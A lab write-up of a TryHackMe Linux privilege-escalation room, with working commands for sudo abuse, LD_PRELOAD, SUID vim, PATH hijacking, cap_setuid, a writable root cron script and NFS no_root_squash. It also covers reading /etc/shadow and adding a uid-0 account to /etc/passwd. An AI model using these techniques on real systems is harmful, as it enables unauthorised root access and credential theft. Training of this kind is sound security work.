# Linux Privilege Escalation: Basics (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Privilege Escalation (room 3; the hands-on follow-up to
  [[linux-privilege-escalation-enumeration]] - now *exploit* the misconfigs).
- **Room:** Linux Privilege Escalation: Basics (~75 min, premium). Six escalation vectors, each with its
  **own** target machine (spin up the one matching the task): Sudo, SUID, PATH, Capabilities, Cron, NFS.
- **Date:** 2026-10-17.
- **Status:** SOLVED - all six vectors (Tasks 2-7): Sudo, SUID, PATH, Capabilities, Cron, NFS.
- **Method:** SSH `john : john` over the THM VPN from the Windows PC, driven non-interactively with Python
  `paramiko` (sudo via `echo john | sudo -S ...`).

## Task 2 - Sudo

- **Target:** `<ip>` (`sudo-box`, Ubuntu, kernel `6.8.0-1017-aws`).
- **Answers:** Q1 program runnable with sudo = **`/usr/bin/nano`** (fits the `/3/3/4` mask; the other
  allowed binary `/usr/sbin/apache2` does not). Q2 `/root/flag.txt` = **`THM{…}`**.

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/nano
# (ALL) NOPASSWD: /usr/sbin/apache2       + env_keep+=LD_PRELOAD
```

Three viable techniques here (the box intentionally allows several):

1. **apache2 config-parse leak** (what I used - clean + non-interactive for a one-line file):
   ```bash
   sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /root/flag.txt
   # AH00526: Syntax error on line 1 of /root/flag.txt:
   # Invalid command 'THM{…}', perhaps misspelled ...   <- the flag
   ```
   The bare `-f` first errored `No MPM loaded`; adding the `-C "LoadModule mpm_event_module ..."` makes
   apache2 reach the config-parse stage so it echoes line 1 of the target file. Same trick reads
   `/etc/shadow` (root hash).
2. **nano as root** (GTFOBins): `sudo nano /root/flag.txt` to read, or `sudo nano` -> `^R^X` ->
   `reset; sh 1>&0 2>&0` for a root shell.
3. **LD_PRELOAD** (gcc present, `env_keep+=LD_PRELOAD` set): compile a `.so` whose `_init()` does
   `setuid(0); system("/bin/bash")`, then `sudo LD_PRELOAD=/tmp/x.so apache2` -> root shell. (Ignored if
   real uid != effective uid; works here because sudo keeps the env var.)

**Key idea:** a single allowed binary = root if it can read/write arbitrary files or exec. Always check
`sudo -l` first, then https://gtfobins.github.io for the binary. `env_keep+=LD_PRELOAD` / `secure_path`
in the Defaults line are themselves escalation tells.

## Task 3 - SUID

- **Target:** `<ip>` (`suid-box`, Ubuntu). `/root` not listable as john.
- **Answers:** Q1 vulnerable SUID binary in `/usr/bin/` = **`/usr/bin/vim.basic`** (fits the `/3/3/3.5`
  mask; the real vim binary shouldn't be SUID). Q2 flag (`/root/root_priv_esc_flag.txt`) =
  **`THM{…}`**.

```bash
find / -type f -perm -4000 2>/dev/null        # -> /usr/bin/vim.basic is the odd one (SUID root)
ls -la /usr/bin/vim.basic                     # -rwsr-xr-x root root  (s bit)
```

Exploit - **python3 inside SUID vim** (GTFOBins). vim.basic is compiled with `+python3`, and under SUID
its euid is 0, so `os.setuid(0)` promotes to full root:

```bash
/usr/bin/vim.basic -es \
  -c ':py3 import os; os.setuid(0); os.system("id; ls -la /root; cat /root/root_priv_esc_flag.txt")' \
  -c ':q!' /dev/null
# uid=0(root) ...   THM{…}
```

- **Gotcha:** vim runs *external* commands (`:!`, `:r!`) with the **real** uid (john) -> `Permission
  denied`. But vim's **internal file read** (`:r /etc/shadow`) and its **embedded python3** keep euid=root,
  so they're the escalation path. `:r /etc/shadow` alone dumps the hashes; `os.setuid(0)` gives a full root
  shell.
- Alternative routes the task shows: `nano`/`vim` SUID to read `/etc/shadow` -> `unshadow` + John; or
  **add a root user to `/etc/passwd`** (`openssl passwd -1 -salt THM password1` -> append
  `hacker:<hash>:0:0:root:/root:/bin/bash`, then `su hacker`). Check candidates against GTFOBins'
  `#//^suid$` filter.

## Task 4 - PATH

- **Target:** `<ip>` (`path-box`).
- **Answers:** Q1 custom SUID binary = **`/opt/path/mywhoami`** (fits `/3/4/8`). Q2 binary it calls from
  PATH = **`whoami`** (6 chars). Q3 `/root/flag.txt` = **`THM{…}`**.

```bash
find / -type f -perm -4000 2>/dev/null | grep -v /snap   # -> /opt/path/mywhoami (the custom one)
strings /opt/path/mywhoami                               # calls: setuid, setgid, system, "whoami"  (relative!)
```

The SUID binary does `setuid(0); setgid(0); system("whoami")` - and `whoami` has **no absolute path**, so
`system()` resolves it via `$PATH`. Hijack it:

```bash
printf '#!/bin/bash\nid; cat /root/flag.txt\n' > /tmp/whoami
chmod +x /tmp/whoami
PATH=/tmp:$PATH /opt/path/mywhoami
# uid=0(root) gid=0(root) ...   THM{…}
```

- **Key idea:** a root-SUID binary that calls a helper **by name** (not absolute path) + any writable dir
  you can put first in `$PATH` = root. `strings` reveals the called name; `/tmp` is the easy drop (prepend
  it, since it isn't in `$PATH` by default). Set `PATH` on the same invocation so the child `sh -c` inherits
  it. (`find / -writable -type d` finds the drop dirs.)

## Task 5 - Capabilities

- **Target:** `<ip>` (`capabilities-box`).
- **Answers:** Q1 binaries with set capabilities = *(find it yourself)* (raw `getcap -r / 2>/dev/null | wc -l`; a smaller count if
  the grader excludes the two snap-mounted `ping` duplicates). Q2 root-capable binary =
  **`/usr/bin/python3.12`** (fits `/3/3/7.2`). Q3 `/root/flag.txt` = **`THM{…}`**.

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.12  cap_setuid=ep     <- the dangerous one
# (others: gst-ptp-helper net_bind/net_admin/sys_nice, mtr-packet/ping/snap-ping cap_net_raw)
```

`cap_setuid=ep` means the binary may call `setuid()` to *any* uid with the capability **effective**
immediately - straight to root:

```bash
/usr/bin/python3.12 -c 'import os; os.setuid(0); os.system("id; cat /root/flag.txt")'
# uid=0(root) ...   THM{…}
```

- **Key idea:** capabilities are an SUID alternative and are **invisible to `find -perm -4000`** - enumerate
  them separately with `getcap -r /`. Dangerous ones: `cap_setuid`/`cap_setgid` (become root),
  `cap_dac_read_search`/`cap_dac_override` (read/write any file), `cap_sys_admin`,
  `cap_sys_ptrace`. `=ep` (effective+permitted) = active on exec. GTFOBins' "Capabilities" section maps each
  binary (python/perl/ruby/vim/gdb all do `setuid(0)` with `cap_setuid`).

## Task 6 - Cron Jobs

- **Target:** `<ip>` (`cron-box`).
- **Answers:** Q1 exploitable cron job = **`/etc/cron.d/cleanup`** (fits `/etc/cron.d/cleanup`). Q2
  `/root/flag.txt` = **`THM{…}`**.

```bash
cat /etc/crontab ; ls -la /etc/cron.d/ ; cat /etc/cron.d/*
# /etc/cron.d/cleanup:  * * * * * root /usr/local/bin/cleanup.sh
ls -la /usr/local/bin/cleanup.sh    # -rwxrwxrwx root root  <- WORLD-WRITABLE, runs as root every minute
```

The job runs a **world-writable** script as root every minute. Append a non-destructive payload (keep the
original cleanup logic - don't break the box), wait one tick, read the result:

```bash
echo 'cp /root/flag.txt /tmp/rootflag.txt; chmod 666 /tmp/rootflag.txt' >> /usr/local/bin/cleanup.sh
# ~60s later:
cat /tmp/rootflag.txt     # THM{…}
# then restore cleanup.sh to its original content
```

- **Key idea:** a root cron job + a script you can write = root. Enumerate **all** cron sources
  (`/etc/crontab`, `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly,monthly}`, `/var/spool/cron/crontabs/`).
  Prefer a non-destructive action (copy the flag, `echo "root:newpass" | chpasswd`, or a reverse shell) and
  **put the script back** - the room stresses not compromising system integrity.
- **Also watch for:** a cron script referenced by a *bare name* (PATH hijack, like Task 4) when `/etc/crontab`
  sets a writable PATH entry; and `tar/7z/rsync *` **wildcard injection** in a root cron (plant
  `--checkpoint-action=exec=...` files). Here it was the simplest case: the script itself was writable.

## Task 7 - NFS

- **Target:** `<ip>` (`nfs-box`). Exploit needs a **root NFS client** (the AttackBox) - you can't
  create a root-owned SUID file from an unprivileged shell.
- **Answers:** Q1 mountable share = **`/opt/nfs`** (fits `/3/3`). Q2 `/root/flag.txt` =
  **`THM{…}`**.

```bash
cat /etc/exports        # on target (world-readable)
# /opt/nfs  *(rw,sync,no_root_squash,no_subtree_check)    <- no_root_squash = the vuln
```

`no_root_squash` means a client's root stays root on the share (default `root_squash` maps it to nobody).
So from the **AttackBox (root)** mount it and plant a root-owned SUID binary:

```bash
# --- on the AttackBox (root) ---
sudo mount -o rw,nolock <ip>:/opt/nfs /tmp/nfs
printf '#include <unistd.h>\n#include <stdlib.h>\nint main(){setgid(0);setuid(0);system("id; cat /root/flag.txt");return 0;}\n' | sudo tee /tmp/nfs/x.c
sudo gcc /tmp/nfs/x.c -o /tmp/nfs/x -w -static && sudo chmod 6755 /tmp/nfs/x
ls -l /tmp/nfs/x        # -rwsr-sr-x root root   (root-owned + SUID, thanks to no_root_squash)

# --- on the target (john) ---
/opt/nfs/x              # runs as root (SUID) -> uid=0(root), prints THM{…}
```

- **Gotcha:** first run gave `Text file busy` (ETXTBSY) - NFS write-back lag right after compile; retry a
  few seconds later. Compile `-static` so it doesn't depend on the target's libs.
- **Key idea:** the SUID bit + root ownership are set on the *client*, but because the share is
  `no_root_squash` the target honours them. Any writable `no_root_squash` export = root. Also check exports
  for readable backups / SSH keys (a stray root private key is a simpler win than the SUID dance).

## Lessons learned

- **Enumerate -> match to a vector -> GTFOBins.** Each vector has a one-command tell: `sudo -l` (sudo),
  `find / -perm -4000` (SUID), `getcap -r /` (capabilities), `cat /etc/crontab` + cron dirs (cron),
  `cat /etc/exports` / `showmount -e` (NFS), and `strings`/writable-PATH for PATH hijacks. GTFOBins maps the
  binary to the payload for sudo/SUID/capabilities.
- **euid vs ruid matters.** SUID gives euid=0 but many programs drop to ruid for *external* commands - vim's
  `:!` ran as john while its internal `:r`/`+python3` stayed root; `cap_setuid`/`setuid(0)` in a SUID or
  capability binary promotes ruid to 0 for a *full* root shell.
- **Two "custom binary calls a helper" patterns:** PATH hijack (helper called by bare name -> put your dir
  first in `$PATH`) and cron (root job runs a writable script/`PATH` name). `strings` the binary first.
- **Capabilities and NFS are invisible to a SUID sweep.** `find -perm -4000` misses `getcap` binaries and
  `no_root_squash` shares entirely - enumerate them explicitly.
- **Stay non-destructive.** Prefer reading the flag / copying it out / a reverse shell over trashing the box,
  and restore anything you modified (the writable cron script). Matches the room's integrity guidance.
- **Sudo:** `sudo -l` is the first move; one NOPASSWD binary that reads files, writes files, or executes is
  usually game over (GTFOBins). File-read-only binaries (cat/nano/apache2) still yield root via
  `/etc/shadow` (crack) or arbitrary-file read; `LD_PRELOAD`/`LD_LIBRARY_PATH` in `env_keep` turns *any*
  sudo-allowed binary into a shell.

## Flags (all vectors)

| Task | Vector | Flag |
|------|--------|------|
| 2 | Sudo (nano/apache2/LD_PRELOAD) | `THM{…}` |
| 3 | SUID (`vim.basic` +python3) | `THM{…}` |
| 4 | PATH hijack (`mywhoami` -> `whoami`) | `THM{…}` |
| 5 | Capabilities (`python3.12 cap_setuid`) | `THM{…}` |
| 6 | Cron (writable `cleanup.sh`) | `THM{…}` |
| 7 | NFS (`no_root_squash` on `/opt/nfs`) | `THM{…}` |

## Lessons learned

*(to be completed once all vectors are done)*

- **Sudo:** `sudo -l` is the first move; one NOPASSWD binary that reads files, writes files, or executes is
  usually game over (GTFOBins). File-read-only binaries (cat/nano/apache2) still yield root via
  `/etc/shadow` (crack) or arbitrary-file read; `LD_PRELOAD`/`LD_LIBRARY_PATH` in `env_keep` turns *any*
  sudo-allowed binary into a shell.

## Related

- [[linux-privilege-escalation-enumeration]] - the enumeration that finds these (this room exploits them).
- [[host-server-configuration-reviews]] - sudo/file-perm/cron/service misconfig categories, top-down.
- [[privesc-module-plan]] - module tracker.
